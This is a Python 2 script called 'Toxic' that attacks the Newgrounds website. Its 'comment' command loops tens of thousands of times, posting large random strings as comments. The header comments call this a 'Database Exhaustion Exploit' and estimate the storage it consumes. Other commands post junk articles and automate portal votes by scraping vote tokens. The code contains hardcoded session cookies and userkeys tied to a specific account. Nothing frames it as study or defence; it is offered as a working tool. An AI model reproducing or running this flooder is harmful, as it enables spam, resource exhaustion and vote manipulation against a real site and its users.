
# Authenticate Query Unification Application
# Wayne Kenney - 2017                                   
#  _____                 ___     ___ 
# |  _  |___ _ _ ___ ___|_  |   |   |
# |     | . | | | .'|___|_| |_ _| | |
# |__|__|_  |___|__,|   |_____|_|___|
#         |_|                        
# By Pythogen


# Toxic
# Purpose: The purpose of this script is confidential.
# Use: Personal use.
# Version: 1.3

# How to (How to configure channel comment)
# Look for 'A': Replace ID
# Look for 'B': Replace Profile Name

# - Calculations - NG Comment Flooder,
# - Database Exhaustion:
# Hogs 258kb per comment page
# Hogs about 1MB of storage per 4 pages
# Hogs 1GB per 4000 pages

# Frame.py:

#Modules
import requests
from random import randint
import time
import string
import random
from tqdm import tqdm

#Program Information
print '\nPyAqua-1.0 - Requests Module Prototype\nBy Pythogen'


print "\n -= Newgrounds Toxic Framework =-\n"
time.sleep(1)
print "       ._              ___"
print "    .*' .*        _.-*."
print "   (   (       .-' .' (    __"
print "    .   `-._.-*   /    `-*'  `*-."
print " -._.*        _.-'        .-.    `-."
print "           .-'         _.'   `-._   `-."
print " \       .'                      `*-.__`-._"
print "     _.._    /       -.                "
print "   .'-._ `. :   :      `.         :      `+."
print "  /     `. \:    \           `-.   \ `-.    "
print " ||| Gathers Data - Sends Data |||"
time.sleep(1)
print " :        \ ;  \  ;    `. `.    \   `.__\    ;"
print "           ;;   ;     `-.\  \ _.-:* '   `:`._:"
print "        .-*:  ' :   \    ;;-*' *.       .-,"
print "       '   :  ; ;   /:.-'        `        ;"
print "           ; /     :     _.--s+.        .s:"
print " :        / :  :   ;    \   dPT$b.    \d$PTb"
#time.sleep(1)
print "  \     .'  ;  ;   ;     `.:$bd$$$b    `Tbd$"
print "   `._.'   /  /    :       `*^^^^*' ,    `T$"
print "   .-'    : .'      \                      `-._"
print "  /      .+'         \                         \ "
print " ||| Communicates with Server - Database |||"
time.sleep(1)
print " :      /            \`._                       ;"
print "       :          `.  ;                        /"
print "               ;    \ :              ;  ,s*' .'"
print "         '    /      :;              `. '   ("
print "        /   .'       :                   .-*-*."
print "     .-' .-'         ;                .-'      ;"
print " ||| Automatic Voting - Automatic Daily Deposit |||"
time.sleep(1)
print "   .'   /      /    /            ._.-'   _.---("
print "  /    :    .-'   .'         '      *--*''      :"
print " :         /     /`.                `-.__.--._.'"
print "                :   `.                       ;"
print "          '     ;     `-.                    :"
print "         /;     :        `---..._______...--*'"
print "      .-'/`      \            /"
print " ||| Review Flood - Data Exhaustion Exploit |||"
time.sleep(1)
print "    .'  /  \      `._        :  "
print "   /  .'    `.   .-*'        ;"
print "  :  :        \   \ "
print "  ;  ;         ;   ;        :"
print " ||| By Pythogen - Wayne Kenney - 2017 |||"



def id_generator(size=5118, chars=string.ascii_uppercase + string.digits):
	return ''.join(random.choice(chars) for _ in range(size))

#Main Routine.
def main():

	#Enable access to variables ANYWHERE
	global USERNAME
	global PASSWORD
	global login_URL
	global page
	global landing
	global keyword
	global attempts

	#Site's Name (Banner)
	Service = 'Newgrounds - Login'
	#Login URL
	login_URL = 'https://www.newgrounds.com/passport/mode/iframe/appsession/812703283236516b81e11ed4ddac931b30b292034ba228'
	#login_URL redirected to after login_URL containing keyword
	landing = 'http://www.newgrounds.com/bbs'
	#The keyword that indicates successful login_URL detection
	keyword = 'loggedin'

	#Display Banner
	#print '\n%s\n' % (Service)
	USERNAME = "Dev"

# ASCII Font Name 'Big'
print ''
print '  _______        _      '
print ' |__   __|      (_)     '
print '    | | _____  ___  ___ '
print '    | |/ _ \ \/ / |/ __|'
print '    | | (_) >  <| | (__ '
print '    |_|\___/_/\_\_|\___|\n'


#Go to main 
main()

#Console prompt after successful login
def cpPrompt():

	#Command line Construct. Add commands here..
	while(True):

		#Listen for command input
		cmd = raw_input(' %s>' % (USERNAME))

		#Command Construct
		if cmd == '?':
			#Show list of commands
			print '\n- comment\n- post\n- vote\n- quit\n'
		elif cmd == 'quit':
			quit()

		# Publish Comment Post
		elif cmd =='comment':

			print "\n Dispersing Toxic Fumes...\n"

			for i in tqdm(range(1,99999)):

				# Generate Data [Single Declaration]
				a = id_generator()

				#POST Login data
				data1 = \
				{
					'comment': a,
					'page': '1',
					'id': '983077', # (A)
					'userkey': '35988%O005dc86fd782%745aOc54597acff%Pd366dr96%%682c14%7%3%14f%e456sea390e2fObd41r5740rs%68436c%%s2%0%a03d35db280rdPd37d%75rP6fdf30cr00e01eebf94f960be7babc022d95c1655%s%4d7P%%O%rr832835990235566881',
				}

				#Header data
				header_data2 = \
				{
					'X-Requested-With': 'XMLHttpRequest',
					'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36',
					'Referer': 'http://fearnova.newgrounds.com/news/post/983077',
					'Origin': 'http://fearnova.newgrounds.com',
					'Host': 'fearnova.newgrounds.com',				
					'Cookie': '__cfduid=db3173c13b913db562a4ced4cb261393c1490501067; ng_adcode_country_id=2; NGBBS_timestamp=1490573252; NGBBS_last_visit=1490573252; remember_me_checkbox=1; vmk1du5I8m=mjWW4xODdIo7UxBr6Zvztp2Mo%2F3m5rhUJjpJFyd6RsKAnDsF9yA6D132Ukpu4wLikJwsjZapdF_QtWdBnmjvLhIMUZwO0czHg0ZC3dTBackefdh8xP35nAsnHfQR6cbHZQDjqCq43LzhQA47KjAoUIQJ6EzL0KsGbd_1m7A%2F1Tw%3D; __utma=158261541.1985287000.1490501068.1490612103.1490636898.13; __utmb=158261541.60.9.1490638145991; __utmc=158261541; __utmz=158261541.1490636898.13.13.utmcsr=fearnova.newgrounds.com|utmccn=(referral)|utmcmd=referral|utmcct=/; vmkIdu5l8m=6FnAK022VZL3N7Wdhpi9bG9JX44DNwJlq05YpS5QrRe2bSY_OuibIi7C0GEIC69eVfR7HdJI7zdN0rfl7YpbqULGdxZ1eo3hSBwpoCg2EpsXD5VbEQuzri9S97FqfJaR4e02iP9PCuWC4LpO8mkEhvTH46MSypyKnBsuztVS_RA%3D; NG_GG_username=fearnova; ng_user0=a%3A2%3A%7Bs%3A7%3A%22default%22%3Ba%3A0%3A%7B%7Ds%3A10%3A%22Art_portal%22%3Ba%3A1%3A%7Bs%3A21%3A%22suitabilities_to_view%22%3Ba%3A3%3A%7Bi%3A0%3Bs%3A1%3A%22e%22%3Bi%3A1%3Bs%3A1%3A%22t%22%3Bi%3A2%3Bs%3A1%3A%22m%22%3B%7D%7D%7D; __utmt=1; __utma=132636953.309726048.1490501336.1490609071.1490636892.10; __utmb=132636953.54.10.1490636892; __utmc=132636953; __utmz=132636953.1490564721.7.4.utmcsr=wayne.newgrounds.com|utmccn=(referral)|utmcmd=referral|utmcct=/news/post/944254',
					'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
					'Content-Length': '302',
					'Connection': 'keep-alive',
					'Accept-Language': 'en-US,en;q=0.8',
					'Accept-Encoding': 'gzip, deflate',
					'Accept': '*/*',
				}

				# Push it!
				r = requests.post("http://fearnova.newgrounds.com/news/comment", data=data1, headers=header_data2) # (B)
		
		# Publish Article Post
		elif cmd == 'post':

			# Generate Data [Two Declarations]
			b = id_generator()
			c = id_generator()

			#POST Login data
			data2 = \
			{
				'image_url': '',
				'body': 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',
				'comments_pref': '1',
				'emoticon': '6',
				'userkey': '56688%Oc05d116f02ec%245aOc54a97a1ef%Pd35a8r9c%%682c14%7%3%14f%4f56sda3c0e7aOb17br574ars%ae2361%%s4%0%a03d35db38dr9Pd785%7arP6fd952cr00e01eebf94f960be7babc022d95c1655%s%4d7P%%O%rr453535990235517654',
				'post_id': '',
				'subject': 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',
			}

			#Header data
			header_data3 = \
			{
				'X-Requested-With': 'XMLHttpRequest',
				'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36',
				'Referer': 'http://www.newgrounds.com/account/news/post',
				'Origin': 'http://www.newgrounds.com',
				'Host': 'www.newgrounds.com',
				'Cookie': '__cfduid=db3173c13b913db562a4ced4cb261393c1490501067; ng_adcode_country_id=2; remember_me_checkbox=1; __utmt=1; vmkIdu5l8m=hwu2z3jnu47vuw6Wwa205cMgKQWYzWpkr1EvviRxDauCL%2FNVcWQI7PQbHwfIl7XLs5c70sG79kaZX0MmEysCeoO9snyMVS%2F1ym9zGn%2FwLvvKT3wraCKFoHaoUxmwoT37PiJsCiG8Sj7XJuxeA_0XtY4BQaWbUv9FE_Lz0lYCoIY%3D; NG_GG_username=fearnova; ng_user0=a%3A1%3A%7Bs%3A7%3A%22default%22%3Ba%3A0%3A%7B%7D%7D; __utma=158261541.1985287000.1490501068.1490549624.1490551913.5; __utmb=158261541.10.9.1490552782734; __utmc=158261541; __utmz=158261541.1490551913.5.5.utmcsr=fearnova.newgrounds.com|utmccn=(referral)|utmcmd=referral|utmcct=/news/post/983077/1804',
				'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
				'Content-Length': '402',
				'Connection': 'keep-alive',
				'Accept-Language': 'en-US,en;q=0.8',
				'Accept-Encoding': 'gzip, deflate',
				'Accept': '*/*',
			}

			r = requests.post("http://www.newgrounds.com/account/news/post", data=data2, headers=header_data3)

			print "\n Posted!\n"


		elif cmd == 'vote':
			
			link = raw_input("Enter Link: ")

			#Header data
			header_data4 = \
			{
				'X-Requested-With': 'XMLHttpRequest',
				'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36',
				'Referer': 'http://www.newgrounds.com/portal/view/690981',
				'Origin': 'http://www.newgrounds.com',
				'Host': 'www.newgrounds.com',
				'Cookie': '__cfduid=db3173c13b913b562a4ced4cb261393c1490501067; ng_adcode_country_id=2; remember_me_checkbox=1; NGBBS_last_visit=1490573252; NGBBS_timestamp=1490639191; __utma=1.2124903223.1490639197.1490639197.1490639197.1; __utmz=1.1490639197.1.1.utmcsr=newgrounds.com|utmccn=(referral)|utmcmd=referral|utmcct=/portal/view/666980; crtg_rta=ad4g72890020%3D1%3Bad4g336280020%3D1%3Bad4g160600020%3D1%3Bad4g160600040%3D1%3Bad4g3205001%3D1%3B; __qca=P0-1287607432-1490648568034; vmk1du5I8m=sDULSe1cLVJHNTJlrQ5ZYUnvcb8oJ1EZAcITy6IM6FSAnDsF9yA6D132Ukpu4wLikJwsjZapdF_QtWdBnmjvLhIMUZwO0czHg0ZC3dTBackefdh8xP35nAsnHfQR6cbHZQDjqCq43LzhQA47KjAoUIQJ6EzL0KsGbd_1m7A%2F1Tw%3D; __utmt=1; ng_user0=a%3A2%3A%7Bs%3A7%3A%22default%22%3Ba%3A0%3A%7B%7Ds%3A10%3A%22Art_portal%22%3Ba%3A1%3A%7Bs%3A21%3A%22suitabilities_to_view%22%3Ba%3A3%3A%7Bi%3A0%3Bs%3A1%3A%22e%22%3Bi%3A1%3Bs%3A1%3A%22t%22%3Bi%3A2%3Bs%3A1%3A%22m%22%3B%7D%7D%7D; vmkIdu5l8m=5FJNkaGXIAAwYVVFu_VR3dT77qetCJL3HW9pcLNkd5kwyeMt1qD72%2FMIJF1T6KLEUgwZcCQFR%2F_D5JAfBJebogsloFHln8rPWCnkOIuVsfIMeSo6LPzNONnti4I7IkHLDxwgJpNU_ZSi1kDcBUcYcYUrigaULUS6%2FUchahnoVrU%3D; NG_GG_username=fearnova; __utma=158261541.1985287000.1490501068.1490822480.1490825156.24; __utmb=158261541.21.9.1490825264133; __utmc=158261541; __utmz=158261541.1490822480.23.23.utmcsr=fearnova.newgrounds.com|utmccn=(referral)|utmcmd=referral|utmcct=/news/post/983077',
				'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
				'Content-Length': '461',
				'Connection': 'keep-alive',
				'Accept-Language': 'en-US,en;q=0.8',
				'Accept-Encoding': 'gzip, deflate',
				'Accept': '*/*',
			}

			
			# Get Source
			srcc = requests.get(link)
			#print srcc.content

			
			# Under Construction...
			# IMPORTANT: Cookie must be updated when request conflict occurs (Solution has yet to be discovered)
			#ukey = find_between( srcc.content,'/portal/reviews/rate','name="portal_id')
			#ukey2 = find_between(ukey,'value="','/>')
			#ukey = ukey2[:-1]

			ukey2 = '9e788%Oe05db86fbc8f%945aOc54897a16f%Pd304ar9d%%682c14%7%3%14f%6656s2a321eacOb7e7r5746rs%90d36c%%s1%8%ab3d35db687rdPd67e%7drP6fdb07cr00e01eebf94f960be7babc022d95c1655%s%4d7P%%O%rr673635990235586052'
			titleName = find_between( srcc.content,'<title>','</title>')
			voteseed = find_between( srcc.content, 'vote_seed" value', '/>' )
			voteseed = voteseed[:-1]
			voteseed = voteseed[2:]
			votekey = find_between( srcc.content, 'vote_key" value', '/>' )
			votekey = votekey[:-1]
			votekey = votekey[2:]
			voteGO = find_between( srcc.content, 'v0">', '>' )
			voteFin = find_between( voteGO, 'value="', '/' )
			voteFin = voteFin[:-1]
			subID = find_between( srcc.content,'item_id" value="','"/>')

			#print srcc.content

			data3 = \
			{
				'userkey': ukey2,
				'vote_seed': voteseed,
				'vote_key': votekey,
				'item_id': subID,
				'portal_id': '1',
				'vote': voteFin,
				#'userkey': '76588%Ob05d016f0f7e%145aOc54297a65f%Pd3834r91%%682c14%7%1%14f%1456s5a3d0efbOb9cdr574ers%000368%%s1%5%a73d35db28cr5Pd25f%74rP6fd331cr00e01eebf94f960be7babc022d95c1655%s%4d7P%%O%rr908535990235587543',
				#'vote_seed': '58dc47156b225',
				#'vote_key': 'JhYrUjVjlhbTcxNzRmQjhhMStxMm0yYjBlYjc7ZmJfNjtxODJkNDE5KzhWMjE5NDQyZjlfNTcxYmNCN2VkNTJmMjExMzgwOTQxcV9CKzFWYjsyOWZtODE4',
				#'item_id': '673686',
				#'portal_id': '1',
				#'vote': '8506bf20e534bbc2ec29fec1c6e93da4',
			}

#userkey:b2888%Ob05ddf6ffb3e%745aOc54597a7ff%Pd380br96%%682c14%7%7%14f%2c56s5a360e64Obc1cr5748rs%171364%%s5%8%ac3d35db78er0Pdfed%76rP6fd221cr00e01eebf94f960be7babc022d95c1655%s%4d7P%%O%rr933235990235593795
#vote_seed:58dc3a02efbbb
#vote_key:MgXoWvVmI2bTYxZmVmQjVjYitxN20zYjg2NzA7MTNfNDtxZjI4NmZiKzJWMjM5YmUwNjlfODMxYjFCNzA4OGRmNzc3MjgwOTQxcV9CKzFWYjsyOWZtODY2
#item_id:690958
#portal_id:1
#vote:968df160ae1449fe25e643d1ab7879fd

			print "\ntitleName: %s\n" % (titleName)

			print "ukey: " + ukey2
			print "voteseed: " + voteseed
			print "votekey: " + votekey
			#print "voteGO: " + voteGO
			print "voteFin: " + voteFin
			print "subID: " + subID

			r = requests.post("http://www.newgrounds.com/portal/vote", data=data3, headers=header_data4)
			print r
			print r.content

			print "\nVote casted homie!\n"
	
#Used for finding values between tags
def find_between( s, first, last ):
    try:
        start = s.index( first ) + len( first )
        end = s.index( last, start )
        return s[start:end]
    except ValueError:
        return ""


def processReq():

	USERNAME = raw_input("Enter Username: ")
	PASSWORD = raw_input("Enter Password: ")

	#Shorten method
	with requests.Session() as c:

		#POST Login data
		login_data = \
		{
			'username' : USERNAME,
			'password' : PASSWORD,
			'remember' : 1,
			'login' : 1,
		}

		#Header data
		header_data = \
		{
			'Host': 'www.newgrounds.com',
			'Connection': 'keep-alive',
			'Content-Length': '455',
			'Accept': '*/*',
			'Origin': 'http://www.newgrounds.com',
			'X-Requested-With': 'XMLHttpRequest',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
			'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
			'Referer': 'http://www.newgrounds.com/',
		}


		# 1) Direct to login url. Prepare for POST login
		c.get(login_URL)

		# 2) Submit POST data. Initialize login
		c.post(login_URL, data=login_data, headers=header_data)

		# 3) Landing page after login attempt. Function name as object. func.var = x
		processReq.page = c.get(landing)

		# 4) Looking for keyword indicating successful login
		Check = processReq.page.content.find(keyword)


		#Continuous auth checking. Line by line
		while(True):
			if Check == -1:
				print '\nlogin failed. (Try again)'
				#print processReq.page.content
				main()
				processReq()
			else:
				print '\n Welcome, ' + USERNAME + '\n'

				#Login success. Go to command console
				cpPrompt()


#Process Auth Details
processReq()
